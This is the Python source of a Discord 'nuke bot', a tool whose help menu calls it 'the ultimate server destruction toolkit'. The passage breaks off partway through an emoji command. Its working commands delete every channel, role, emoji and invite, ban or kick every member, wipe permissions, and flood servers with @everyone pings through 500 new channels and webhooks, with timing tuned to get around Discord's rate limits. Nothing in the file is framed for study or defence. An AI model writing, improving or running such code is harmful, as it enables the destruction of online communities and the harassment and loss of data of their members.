import discord
from discord.ext import commands
import asyncio
import os
import time

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
START_TIME = time.time()

# ─────────────────────────────────────────────
# WHITELIST
# ─────────────────────────────────────────────

MASTER_ID = 1501897844624461904
WHITELIST  = {MASTER_ID}          # master is always whitelisted

@bot.check
async def is_whitelisted(ctx):
    """Global check — blocks every command for non-whitelisted users."""
    if ctx.author.id in WHITELIST:
        return True
    await safe(ctx.send("❌ **You are not whitelisted to use this bot.**"))
    return False

# ─────────────────────────────────────────────
# CORE HELPERS
# ─────────────────────────────────────────────

async def safe(coro):
    try:
        return await coro
    except Exception:
        pass

STOPPED = False

async def _run_if_not_stopped(coro):
    global STOPPED
    if STOPPED:
        return
    return await safe(coro)

async def batch(coros, size=5, delay=0.5):
    """Run coros in batches of `size` with `delay` seconds between each batch.
    Checks STOPPED before each batch so operations halt immediately once stopped.
    Any coroutines that are never reached are explicitly closed to suppress RuntimeWarnings."""
    global STOPPED
    coros = list(coros)
    reached = 0
    for i in range(0, len(coros), size):
        if STOPPED:
            break
        chunk = coros[i:i + size]
        reached = i + len(chunk)
        await asyncio.gather(*[_run_if_not_stopped(c) for c in chunk])
        if STOPPED:
            break
        if i + size < len(coros):
            await asyncio.sleep(delay)
            if STOPPED:
                break
    # Close any coroutines that were never awaited to prevent RuntimeWarnings
    for c in coros[reached:]:
        if asyncio.iscoroutine(c):
            c.close()

async def status(ctx, action):
    try:
        await ctx.send(f"✅ `{action}` done.")
    except Exception:
        pass

@bot.command()
async def stop(ctx):
    global STOPPED
    STOPPED = True
    await ctx.send("🛑 **All operations stopped.** Use `!resume` to re-enable.")

@bot.command()
async def resume(ctx):
    global STOPPED
    STOPPED = False
    await ctx.send("▶️ **Operations resumed.**")

# ─────────────────────────────────────────────
# WHITELIST MANAGEMENT  (master only)
# ─────────────────────────────────────────────

def master_only(ctx):
    return ctx.author.id == MASTER_ID

@bot.command()
async def wladd(ctx, user_id: int):
    """Add a user ID to the whitelist (master only)"""
    if not master_only(ctx):
        await ctx.send("❌ Only the master can manage the whitelist.")
        return
    WHITELIST.add(user_id)
    embed = discord.Embed(
        title="✅ Whitelisted",
        description=f"`{user_id}` has been added to the whitelist.",
        color=0x57f287,
    )
    await ctx.send(embed=embed)

@bot.command()
async def wlremove(ctx, user_id: int):
    """Remove a user ID from the whitelist (master only)"""
    if not master_only(ctx):
        await ctx.send("❌ Only the master can manage the whitelist.")
        return
    if user_id == MASTER_ID:
        await ctx.send("❌ Cannot remove the master from the whitelist.")
        return
    WHITELIST.discard(user_id)
    embed = discord.Embed(
        title="🗑️ Removed",
        description=f"`{user_id}` has been removed from the whitelist.",
        color=0xff0000,
    )
    await ctx.send(embed=embed)

@bot.command()
async def wllist(ctx):
    """Show all whitelisted user IDs (master only)"""
    if not master_only(ctx):
        await ctx.send("❌ Only the master can view the whitelist.")
        return
    lines = []
    for uid in sorted(WHITELIST):
        tag = " 👑 *(master)*" if uid == MASTER_ID else ""
        lines.append(f"`{uid}`{tag}")
    embed = discord.Embed(
        title="📋 Whitelist",
        description="\n".join(lines) if lines else "*(empty)*",
        color=0xffd700,
    )
    embed.set_footer(text=f"{len(WHITELIST)} user(s) whitelisted")
    await ctx.send(embed=embed)

# Batch sizes tuned per Discord rate-limit bucket
BATCH_MSG   = dict(size=5,  delay=1.1)   # messages: 5/s per channel
BATCH_WH    = dict(size=30, delay=0.1)   # webhooks have own bucket — much faster
BATCH_CH    = dict(size=5,  delay=1.1)   # channel create/delete/edit: ~5/s
BATCH_ROLE  = dict(size=5,  delay=1.1)   # role operations: ~5/s
BATCH_MBR   = dict(size=5,  delay=1.0)   # member ban/kick/edit: ~5/s

# ─────────────────────────────────────────────
# HELP
# ─────────────────────────────────────────────

@bot.command()
async def help(ctx):
    # ── Header embed ──────────────────────────────────────────────────────────
    header = discord.Embed(
        title="💥  N U K E  B O T",
        description=(
            "**The ultimate server destruction toolkit.**\n"
            "Use `!stop` at any time to halt all running operations.\n"
            "─────────────────────────────────────────"
        ),
        color=0xff0000,
    )
    header.set_image(url="https://media.tenor.com/R2aRkFNFMFMAAAAC/explosion-nuke.gif")
    header.set_footer(text="⚠️  Use responsibly — for servers you own only.")
    await ctx.send(embed=header)

    # ── Channels ─────────────────────────────────────────────────────────────
    ch_embed = discord.Embed(
        title="📁  Channels",
        description=(
            "`!mc <name> <count>` — Mass create text channels\n"
            "`!mcv <name> <count>` — Mass create voice channels\n"
            "`!mcat <name> <count>` — Mass create categories\n"
            "`!dac` — Delete **ALL** channels\n"
            "`!datc` — Delete all text channels\n"
            "`!davc` — Delete all voice channels\n"
            "`!dacat` — Delete all categories\n"
            "`!renameall <name>` — Rename all channels\n"
            "`!lockall` — Lock all channels\n"
            "`!unlockall` — Unlock all channels\n"
            "`!hideall` — Hide all channels from @everyone\n"
            "`!showall` — Show all channels to @everyone\n"
            "`!slowall <seconds>` — Set slowmode in all channels\n"
            "`!nsfwall` — Mark all text channels NSFW\n"
            "`!unnsfwall` — Unmark NSFW on all channels\n"
            "`!topicall <topic>` — Set topic in all text channels\n"
            "`!delpins` — Delete pinned messages in current channel\n"
            "`!delpinsall` — Delete pinned messages in all channels\n"
            "`!clonech <channel> <count>` — Clone a channel multiple times\n"
            "`!channelinfo` — List all channels with IDs\n"
            "`!nuke <name> <msg>` — 💥 **Holy Grail**: channels + webhooks + pings simultaneously\n"
            "`!nukeall <name>` — Delete all channels & recreate\n"
        ),
        color=0x00b0f4,
    )
    ch_embed.set_thumbnail(url="https://cdn.discordapp.com/emojis/960544078820700180.webp")
    ch_embed.set_image(url="https://media.tenor.com/8wMfaHn5VXQAAAAC/boom-explosion.gif")
    await ctx.send(embed=ch_embed)

    # ── Roles ─────────────────────────────────────────────────────────────────
    role_embed = discord.Embed(
        title="🎭  Roles",
        description=(
            "`!mr <name> <count>` — Mass create roles\n"
            "`!dar` — Delete **ALL** roles\n"
            "`!renameallr <name>` — Rename all roles\n"
            "`!massrole <role>` — Give role to all members\n"
            "`!stripall` — Remove all roles from all members\n"
            "`!adminrole <role>` — Give a role Administrator perms\n"
            "`!depermsall` — Wipe all permissions from all roles\n"
            "`!colorallr <hex>` — Change all roles to one color (e.g. `ff0000`)\n"
            "`!mentionallr` — Make all roles mentionable\n"
            "`!hoistallr` — Hoist all roles\n"
            "`!listroles` — List all roles with IDs\n"
        ),
        color=0xffa500,
    )
    role_embed.set_image(url="https://media.tenor.com/pGBBFUJRwnYAAAAC/fire-flame.gif")
    await ctx.send(embed=role_embed)

    # ── Members ───────────────────────────────────────────────────────────────
    mbr_embed = discord.Embed(
        title="👥  Members",
        description=(
            "`!ban` — Ban **ALL** members\n"
            "`!kick` — Kick **ALL** members\n"
            "`!mban <count>` — Ban X members\n"
            "`!mkick <count>` — Kick X members\n"
            "`!massunban` — Unban all banned members\n"
            "`!dmall <message>` — DM all members\n"
            "`!massdeafen` — Deafen all voice members\n"
            "`!massmute` — Mute all voice members\n"
            "`!undeafenall` — Undeafen all voice members\n"
            "`!unmuteall` — Unmute all voice members\n"
            "`!massmove <channel>` — Move all voice members\n"
            "`!voicekick` — Disconnect all voice members\n"
            "`!nickall <nick>` — Change all member nicknames\n"
            "`!resetnicks` — Reset all member nicknames\n"
            "`!timeoutall <minutes>` — Timeout all members\n"
            "`!untimeoutall` — Remove timeouts from all members\n"
            "`!membercount` — Show member count breakdown\n"
            "`!listbans` — List all banned users\n"
        ),
        color=0x57f287,
    )
    mbr_embed.set_image(url="https://media.tenor.com/tnHpAFMBxLQAAAAC/skull-dead.gif")
    await ctx.send(embed=mbr_embed)

    # ── Messaging ─────────────────────────────────────────────────────────────
    msg_embed = discord.Embed(
        title="💬  Messaging",
        description=(
            "`!mcp <name> <count> <pings> <msg>` — Create channels + ping simultaneously\n"
            "`!spam <count> <message>` — Spam in current channel\n"
            "`!spamall <count> <message>` — Spam in **ALL** channels\n"
            "`!pingall <count>` — Ping @everyone X times in all channels\n"
            "`!pingr <role> <count>` — Ping a role X times in all channels\n"
            "`!ghostping <count>` — Ghost ping @everyone in current channel\n"
            "`!ghostpingall <count>` — Ghost ping @everyone in **ALL** channels\n"
            "`!tts <message>` — Send TTS in current channel\n"
            "`!ttsall <message>` — Send TTS in **ALL** channels\n"
            "`!embedspam <count> <title> | <body>` — Spam embed in current channel\n"
            "`!embedall <title> | <body>` — Send embed to **ALL** channels\n"
            "`!purge <count>` — Purge messages in current channel\n"
            "`!purgeall <count>` — Purge messages in **ALL** channels\n"
            "`!purgebots <count>` — Purge bot messages in current channel\n"
            "`!say <#channel> <message>` — Send a message to a specific channel\n"
            "`!wspam <count> <message>` — ⚡ Webhook spam in current channel\n"
            "`!wspamall <count> <message>` — ⚡ Webhook spam in **ALL** channels\n"
            "`!whnuke <name> <count> <pings> <msg>` — ⚡ Channels + webhook + blast\n"
        ),
        color=0xeb459e,
    )
    msg_embed.set_image(url="https://media.tenor.com/RI3gGPnilZkAAAAC/message-spam.gif")
    await ctx.send(embed=msg_embed)

    # ── Server ────────────────────────────────────────────────────────────────
    srv_embed = discord.Embed(
        title="🌐  Server",
        description=(
            "`!renameserver <name>` — Rename the server\n"
            "`!icon <url>` — Change server icon\n"
            "`!banner <url>` — Change server banner\n"
            "`!description <text>` — Change server description\n"
            "`!das` — Delete all stickers\n"
            "`!delemojis` — Delete all custom emojis\n"
            "`!addemoji <name> <url>` — Add a custom emoji from URL\n"
            "`!delthreads` — Delete all threads\n"
            "`!delwebhooks` — Delete all webhooks\n"
            "`!delinvites` — Delete all invites\n"
            "`!listinvites` — List all active invites\n"
            "`!webhook <name> <count>` — Mass create webhooks in all channels\n"
            "`!audit <count>` — Show recent audit log entries\n"
            "`!serverinfo` — Show server info\n"
            "`!everything` — ☢️ Run **ALL** nuke commands at once\n"
        ),
        color=0x9b59b6,
    )
    srv_embed.set_image(url="https://media.tenor.com/PNkHxmTIbxoAAAAC/server-discord.gif")
    await ctx.send(embed=srv_embed)

    # ── Bot ───────────────────────────────────────────────────────────────────
    bot_embed = discord.Embed(
        title="🤖  Bot Controls",
        description=(
            "`!ping` — Bot latency\n"
            "`!uptime` — How long the bot has been running\n"
            "`!botstatus <status>` — Change bot status message\n"
            "`!botname <name>` — Change the bot's username\n"
            "`!stop` — 🛑 **Stop** all running operations instantly\n"
            "`!resume` — ▶️ **Resume** operations after stop\n"
        ),
        color=0xffd700,
    )
    bot_embed.set_image(url="https://media.tenor.com/xHcUNNTXUgQAAAAC/robot-bot.gif")
    bot_embed.set_footer(
        text=f"Nuke Bot  •  {bot.user}  •  Prefix: !",
        icon_url=bot.user.display_avatar.url if bot.user else None,
    )
    await ctx.send(embed=bot_embed)

    # ── Whitelist (master only) ───────────────────────────────────────────────
    wl_embed = discord.Embed(
        title="🔐  Whitelist  *(master only)*",
        description=(
            "`!wladd <user_id>` — Add a user to the whitelist\n"
            "`!wlremove <user_id>` — Remove a user from the whitelist\n"
            "`!wllist` — Show all whitelisted user IDs\n\n"
            "Only the master `👑` can run these commands.\n"
            "Non-whitelisted users are blocked from **all** commands."
        ),
        color=0x2f3136,
    )
    wl_embed.set_footer(text=f"Master ID: {MASTER_ID}")
    await ctx.send(embed=wl_embed)

# ─────────────────────────────────────────────
# CHANNELS
# ─────────────────────────────────────────────

@bot.command()
async def mc(ctx, name: str, count: int):
    await batch([ctx.guild.create_text_channel(name) for _ in range(count)], **BATCH_CH)
    await status(ctx, f"mc {name} {count}")

@bot.command()
async def mcv(ctx, name: str, count: int):
    await batch([ctx.guild.create_voice_channel(name) for _ in range(count)], **BATCH_CH)
    await status(ctx, f"mcv {name} {count}")

@bot.command()
async def mcat(ctx, name: str, count: int):
    await batch([ctx.guild.create_category(name) for _ in range(count)], **BATCH_CH)
    await status(ctx, f"mcat {name} {count}")

@bot.command()
async def dac(ctx):
    await batch([ch.delete() for ch in ctx.guild.channels], **BATCH_CH)
    await status(ctx, "dac")

@bot.command()
async def datc(ctx):
    await batch([ch.delete() for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "datc")

@bot.command()
async def davc(ctx):
    await batch([ch.delete() for ch in ctx.guild.voice_channels], **BATCH_CH)
    await status(ctx, "davc")

@bot.command()
async def dacat(ctx):
    await batch([cat.delete() for cat in ctx.guild.categories], **BATCH_CH)
    await status(ctx, "dacat")

@bot.command()
async def renameall(ctx, *, name: str):
    await batch([ch.edit(name=name) for ch in ctx.guild.channels], **BATCH_CH)
    await status(ctx, f"renameall {name}")

@bot.command()
async def lockall(ctx):
    await batch(
        [ch.set_permissions(ctx.guild.default_role, send_messages=False)
         for ch in ctx.guild.text_channels],
        **BATCH_CH
    )
    await status(ctx, "lockall")

@bot.command()
async def unlockall(ctx):
    await batch(
        [ch.set_permissions(ctx.guild.default_role, send_messages=True)
         for ch in ctx.guild.text_channels],
        **BATCH_CH
    )
    await status(ctx, "unlockall")

@bot.command()
async def hideall(ctx):
    await batch(
        [ch.set_permissions(ctx.guild.default_role, view_channel=False)
         for ch in ctx.guild.channels],
        **BATCH_CH
    )
    await status(ctx, "hideall")

@bot.command()
async def showall(ctx):
    await batch(
        [ch.set_permissions(ctx.guild.default_role, view_channel=True)
         for ch in ctx.guild.channels],
        **BATCH_CH
    )
    await status(ctx, "showall")

@bot.command()
async def slowall(ctx, seconds: int):
    await batch([ch.edit(slowmode_delay=seconds) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, f"slowall {seconds}s")

@bot.command()
async def nsfwall(ctx):
    await batch([ch.edit(nsfw=True) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "nsfwall")

@bot.command()
async def unnsfwall(ctx):
    await batch([ch.edit(nsfw=False) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "unnsfwall")

@bot.command()
async def topicall(ctx, *, topic: str):
    await batch([ch.edit(topic=topic) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, f"topicall")

@bot.command()
async def delpins(ctx):
    pins = await ctx.channel.pins()
    await batch([msg.unpin() for msg in pins], **BATCH_MSG)
    await status(ctx, "delpins")

@bot.command()
async def delpinsall(ctx):
    async def unpin_all(ch):
        pins = await safe(ch.pins())
        if pins:
            for msg in pins:
                await safe(msg.unpin())
    await batch([unpin_all(ch) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "delpinsall")

@bot.command()
async def clonech(ctx, channel: discord.TextChannel, count: int):
    await batch([channel.clone() for _ in range(count)], **BATCH_CH)
    await status(ctx, f"clonech {channel.name} x{count}")

@bot.command()
async def channelinfo(ctx):
    lines = [f"`{ch.id}` — #{ch.name} ({type(ch).__name__})" for ch in ctx.guild.channels]
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

# ─────────────────────────────────────────────
# NUKE — CHANNELS + WEBHOOKS + PINGS IN PARALLEL
# ─────────────────────────────────────────────

@bot.command()
async def nuke(ctx, name: str, *, message: str = "@everyone"):
    """💥 Holy Grail — deletes ALL channels first, then floods with new ones and blasts pings.
    Uses direct sends (no webhooks) to avoid Discord's guild-level webhook rate limit."""
    global STOPPED
    STOPPED = False

    # Step 1: wipe every existing channel
    await batch([ch.delete() for ch in ctx.guild.channels], **BATCH_CH)

    # Step 2: create channels in batches; the moment each channel exists,
    # blast 30 messages into it concurrently while more channels are created.
    ch_sem = asyncio.Semaphore(5)

    async def nuke_one():
        async with ch_sem:
            if STOPPED:
                return
            ch = await safe(ctx.guild.create_text_channel(name))
            if not ch:
                return
        # Blast messages OUTSIDE the semaphore — doesn't block channel creation
        await asyncio.gather(*[safe(ch.send(message)) for _ in range(30)])

    await asyncio.gather(*[nuke_one() for _ in range(500)])
    await status(ctx, "nuke")

@bot.command()
async def nukeall(ctx, *, name: str = "nuked"):
    await batch([ch.delete() for ch in ctx.guild.channels], **BATCH_CH)
    await batch([ctx.guild.create_text_channel(name) for _ in range(10)], **BATCH_CH)
    await status(ctx, f"nukeall {name}")

# ─────────────────────────────────────────────
# ROLES
# ─────────────────────────────────────────────

@bot.command()
async def mr(ctx, name: str, count: int):
    await batch([ctx.guild.create_role(name=name) for _ in range(count)], **BATCH_ROLE)
    await status(ctx, f"mr {name} {count}")

@bot.command()
async def dar(ctx):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    await batch([r.delete() for r in ctx.guild.roles if r not in protected], **BATCH_ROLE)
    await status(ctx, "dar")

@bot.command()
async def renameallr(ctx, *, name: str):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    await batch([r.edit(name=name) for r in ctx.guild.roles if r not in protected], **BATCH_ROLE)
    await status(ctx, f"renameallr {name}")

@bot.command()
async def massrole(ctx, role: discord.Role):
    await batch([m.add_roles(role) for m in ctx.guild.members if not m.bot], **BATCH_MBR)
    await status(ctx, f"massrole {role.name}")

@bot.command()
async def stripall(ctx):
    async def strip(m):
        removable = [r for r in m.roles if r != ctx.guild.default_role and r < ctx.guild.me.top_role]
        if removable:
            await m.remove_roles(*removable)
    await batch([strip(m) for m in ctx.guild.members if not m.bot], **BATCH_MBR)
    await status(ctx, "stripall")

@bot.command()
async def adminrole(ctx, role: discord.Role):
    await role.edit(permissions=discord.Permissions(administrator=True))
    await status(ctx, f"adminrole {role.name}")

@bot.command()
async def depermsall(ctx):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    await batch(
        [r.edit(permissions=discord.Permissions.none()) for r in ctx.guild.roles if r not in protected],
        **BATCH_ROLE
    )
    await status(ctx, "depermsall")

@bot.command()
async def colorallr(ctx, hex_color: str):
    """Change all roles to a hex color, e.g. !colorallr ff0000"""
    hex_color = hex_color.strip("#")
    try:
        color = discord.Color(int(hex_color, 16))
    except ValueError:
        await ctx.send("❌ Invalid hex color. Example: `!colorallr ff0000`")
        return
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    await batch(
        [r.edit(color=color) for r in ctx.guild.roles if r not in protected],
        **BATCH_ROLE
    )
    await status(ctx, f"colorallr #{hex_color}")

@bot.command()
async def mentionallr(ctx):
    """Make all roles mentionable"""
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    await batch(
        [r.edit(mentionable=True) for r in ctx.guild.roles if r not in protected],
        **BATCH_ROLE
    )
    await status(ctx, "mentionallr")

@bot.command()
async def hoistallr(ctx):
    """Hoist all roles (show separately in member list)"""
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    await batch(
        [r.edit(hoist=True) for r in ctx.guild.roles if r not in protected],
        **BATCH_ROLE
    )
    await status(ctx, "hoistallr")

@bot.command()
async def listroles(ctx):
    lines = [f"`{r.id}` — @{r.name} ({len(r.members)} members)" for r in ctx.guild.roles]
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

# ─────────────────────────────────────────────
# MEMBERS
# ─────────────────────────────────────────────

@bot.command()
async def ban(ctx):
    targets = [m for m in ctx.guild.members if m != ctx.guild.me and m != ctx.guild.owner]
    await batch([m.ban(reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, "ban")

@bot.command()
async def kick(ctx):
    targets = [m for m in ctx.guild.members if m != ctx.guild.me and m != ctx.guild.owner]
    await batch([m.kick(reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, "kick")

@bot.command()
async def mban(ctx, count: int):
    targets = [m for m in ctx.guild.members
               if m != ctx.guild.me and m != ctx.guild.owner and not m.bot][:count]
    await batch([m.ban(reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, f"mban {count}")

@bot.command()
async def mkick(ctx, count: int):
    targets = [m for m in ctx.guild.members
               if m != ctx.guild.me and m != ctx.guild.owner and not m.bot][:count]
    await batch([m.kick(reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, f"mkick {count}")

@bot.command()
async def massunban(ctx):
    bans = [entry async for entry in ctx.guild.bans()]
    await batch([ctx.guild.unban(entry.user) for entry in bans], **BATCH_MBR)
    await status(ctx, "massunban")

@bot.command()
async def dmall(ctx, *, message: str):
    await batch([m.send(message) for m in ctx.guild.members if not m.bot], **BATCH_MSG)
    await status(ctx, "dmall")

@bot.command()
async def massdeafen(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.edit(deafen=True) for m in members], **BATCH_MBR)
    await status(ctx, "massdeafen")

@bot.command()
async def massmute(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.edit(mute=True) for m in members], **BATCH_MBR)
    await status(ctx, "massmute")

@bot.command()
async def undeafenall(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.edit(deafen=False) for m in members], **BATCH_MBR)
    await status(ctx, "undeafenall")

@bot.command()
async def unmuteall(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.edit(mute=False) for m in members], **BATCH_MBR)
    await status(ctx, "unmuteall")

@bot.command()
async def massmove(ctx, channel: discord.VoiceChannel):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.move_to(channel) for m in members], **BATCH_MBR)
    await status(ctx, f"massmove {channel.name}")

@bot.command()
async def voicekick(ctx):
    """Disconnect all voice members"""
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.move_to(None) for m in members], **BATCH_MBR)
    await status(ctx, "voicekick")

@bot.command()
async def nickall(ctx, *, nick: str):
    """Change all member nicknames"""
    targets = [m for m in ctx.guild.members if not m.bot and m != ctx.guild.me]
    await batch([m.edit(nick=nick) for m in targets], **BATCH_MBR)
    await status(ctx, f"nickall {nick}")

@bot.command()
async def resetnicks(ctx):
    """Reset all member nicknames"""
    targets = [m for m in ctx.guild.members if not m.bot and m != ctx.guild.me and m.nick]
    await batch([m.edit(nick=None) for m in targets], **BATCH_MBR)
    await status(ctx, "resetnicks")

@bot.command()
async def timeoutall(ctx, minutes: int):
    """Timeout all members for X minutes"""
    import datetime
    until = discord.utils.utcnow() + datetime.timedelta(minutes=minutes)
    targets = [m for m in ctx.guild.members
               if not m.bot and m != ctx.guild.me and m != ctx.guild.owner]
    await batch([m.timeout(until, reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, f"timeoutall {minutes}m")

@bot.command()
async def untimeoutall(ctx):
    """Remove timeouts from all members"""
    targets = [m for m in ctx.guild.members if m.is_timed_out()]
    await batch([m.timeout(None) for m in targets], **BATCH_MBR)
    await status(ctx, "untimeoutall")

@bot.command()
async def membercount(ctx):
    guild = ctx.guild
    total = guild.member_count
    bots = sum(1 for m in guild.members if m.bot)
    humans = total - bots
    online = sum(1 for m in guild.members if m.status != discord.Status.offline)
    embed = discord.Embed(title=f"👥 {guild.name} — Member Count", color=0xff0000)
    embed.add_field(name="Total", value=str(total))
    embed.add_field(name="Humans", value=str(humans))
    embed.add_field(name="Bots", value=str(bots))
    embed.add_field(name="Online", value=str(online))
    await ctx.send(embed=embed)

@bot.command()
async def listbans(ctx):
    bans = [entry async for entry in ctx.guild.bans()]
    if not bans:
        await ctx.send("No banned users.")
        return
    lines = [f"`{entry.user.id}` — {entry.user} ({entry.reason or 'No reason'})" for entry in bans]
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

# ─────────────────────────────────────────────
# MESSAGING
# ─────────────────────────────────────────────

@bot.command()
async def mcp(ctx, name: str, count: int, pings: int = 5, *, message: str = "@everyone"):
    """Create channels and ping simultaneously — one webhook per channel, blasted immediately"""
    ch_sem = asyncio.Semaphore(5)

    async def create_and_ping():
        async with ch_sem:
            ch = await safe(ctx.guild.create_text_channel(name))
            if not ch:
                return
        await asyncio.gather(*[safe(ch.send(message)) for _ in range(pings)])

    await asyncio.gather(*[create_and_ping() for _ in range(count)])
    await status(ctx, f"mcp {name} {count} x{pings}")

@bot.command()
async def spam(ctx, count: int, *, message: str):
    await batch([ctx.channel.send(message) for _ in range(count)], **BATCH_MSG)
    await status(ctx, f"spam {count}")

@bot.command()
async def spamall(ctx, count: int, *, message: str):
    coros = [ch.send(message) for ch in ctx.guild.text_channels for _ in range(count)]
    await batch(coros, **BATCH_MSG)
    await status(ctx, f"spamall {count}")

@bot.command()
async def pingall(ctx, count: int):
    coros = [ch.send("@everyone") for ch in ctx.guild.text_channels for _ in range(count)]
    await batch(coros, **BATCH_MSG)
    await status(ctx, f"pingall {count}")

@bot.command()
async def pingr(ctx, role: discord.Role, count: int):
    coros = [ch.send(role.mention) for ch in ctx.guild.text_channels for _ in range(count)]
    await batch(coros, **BATCH_MSG)
    await status(ctx, f"pingr {role.name} {count}")

@bot.command()
async def ghostping(ctx, count: int = 1):
    """Ghost ping @everyone X times in current channel"""
    async def ghost():
        msg = await safe(ctx.channel.send("@everyone"))
        if msg:
            await safe(msg.delete())
    await batch([ghost() for _ in range(count)], **BATCH_MSG)
    await status(ctx, f"ghostping x{count}")

@bot.command()
async def ghostpingall(ctx, count: int = 1):
    """Ghost ping @everyone X times in ALL channels"""
    async def ghost_ch(ch):
        for _ in range(count):
            msg = await safe(ch.send("@everyone"))
            if msg:
                await safe(msg.delete())
    await batch([ghost_ch(ch) for ch in ctx.guild.text_channels], **BATCH_MSG)
    await status(ctx, f"ghostpingall x{count}")

@bot.command()
async def tts(ctx, *, message: str):
    """Send TTS message in current channel"""
    await safe(ctx.channel.send(message, tts=True))
    await status(ctx, "tts")

@bot.command()
async def ttsall(ctx, *, message: str):
    """Send TTS message in ALL channels"""
    await batch([ch.send(message, tts=True) for ch in ctx.guild.text_channels], **BATCH_MSG)
    await status(ctx, "ttsall")

@bot.command()
async def embedspam(ctx, count: int, *, text: str):
    """Spam embed in current channel. Separate title and body with |"""
    parts = text.split("|", 1)
    title = parts[0].strip()
    body = parts[1].strip() if len(parts) > 1 else "\u200b"
    embed = discord.Embed(title=title, description=body, color=0xff0000)
    await batch([ctx.channel.send(embed=embed) for _ in range(count)], **BATCH_MSG)
    await status(ctx, f"embedspam {count}")

@bot.command()
async def embedall(ctx, *, text: str):
    """Send embed to ALL channels. Separate title and body with |"""
    parts = text.split("|", 1)
    title = parts[0].strip()
    body = parts[1].strip() if len(parts) > 1 else "\u200b"
    embed = discord.Embed(title=title, description=body, color=0xff0000)
    await batch([ch.send(embed=embed) for ch in ctx.guild.text_channels], **BATCH_MSG)
    await status(ctx, "embedall")

@bot.command()
async def purge(ctx, count: int):
    """Purge messages in current channel"""
    await ctx.channel.purge(limit=count + 1)
    await status(ctx, f"purge {count}")

@bot.command()
async def purgeall(ctx, count: int):
    """Purge messages in ALL channels"""
    await batch([ch.purge(limit=count) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, f"purgeall {count}")

@bot.command()
async def purgebots(ctx, count: int):
    """Purge bot messages in current channel"""
    await ctx.channel.purge(limit=count + 1, check=lambda m: m.author.bot)
    await status(ctx, f"purgebots {count}")

@bot.command()
async def say(ctx, channel: discord.TextChannel, *, message: str):
    """Send a message to a specific channel"""
    await safe(channel.send(message))
    await status(ctx, f"say #{channel.name}")

@bot.command()
async def wspam(ctx, count: int, *, message: str):
    """Webhook spam in current channel — fastest possible spam"""
    wh = await safe(ctx.channel.create_webhook(name="spam"))
    if wh:
        await batch([wh.send(message) for _ in range(count)], **BATCH_WH)
        await safe(wh.delete())
    await status(ctx, f"wspam {count}")

@bot.command()
async def wspamall(ctx, count: int, *, message: str):
    """Create a webhook in every channel and spam them all simultaneously"""
    webhooks = []
    for ch in ctx.guild.text_channels:
        wh = await safe(ch.create_webhook(name="spam"))
        if wh:
            webhooks.append(wh)
    coros = [wh.send(message) for wh in webhooks for _ in range(count)]
    await batch(coros, **BATCH_WH)
    await batch([wh.delete() for wh in webhooks], **BATCH_CH)
    await status(ctx, f"wspamall {count}")

@bot.command()
async def whnuke(ctx, name: str, count: int, pings: int = 10, *, message: str = "@everyone"):
    """Create `count` channels each with a webhook, blast `pings` messages through each simultaneously"""
    ch_sem = asyncio.Semaphore(5)

    async def make_and_blast():
        async with ch_sem:
            ch = await safe(ctx.guild.create_text_channel(name))
            if not ch:
                return
            wh = await safe(ch.create_webhook(name="nuke"))
            if not wh:
                return
        await asyncio.gather(*[safe(wh.send(message)) for _ in range(pings)])

    await asyncio.gather(*[make_and_blast() for _ in range(count)])
    await status(ctx, f"whnuke {name} {count} x{pings}")

# ─────────────────────────────────────────────
# SERVER
# ─────────────────────────────────────────────

@bot.command()
async def renameserver(ctx, *, name: str):
    await ctx.guild.edit(name=name)
    await status(ctx, f"renameserver {name}")

@bot.command()
async def icon(ctx, url: str):
    """Change server icon from a URL"""
    import aiohttp
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                await ctx.send("❌ Failed to fetch image.")
                return
            data = await resp.read()
    await ctx.guild.edit(icon=data)
    await status(ctx, "icon")

@bot.command()
async def banner(ctx, url: str):
    """Change server banner from a URL"""
    import aiohttp
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                await ctx.send("❌ Failed to fetch image.")
                return
            data = await resp.read()
    await ctx.guild.edit(banner=data)
    await status(ctx, "banner")

@bot.command()
async def description(ctx, *, text: str):
    """Change server description"""
    await ctx.guild.edit(description=text)
    await status(ctx, "description")

@bot.command()
async def das(ctx):
    await batch([s.delete() for s in ctx.guild.stickers], **BATCH_CH)
    await status(ctx, "das")

@bot.command()
async def delemojis(ctx):
    """Delete all custom emojis"""
    await batch([e.delete() for e in ctx.guild.emojis], **BATCH_CH)
    await status(ctx, "delemojis")

@bot.command()
async def addemoji(ctx, name: str, url: str):
    """Add a custom emoji from a URL"""
    import aiohttp
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
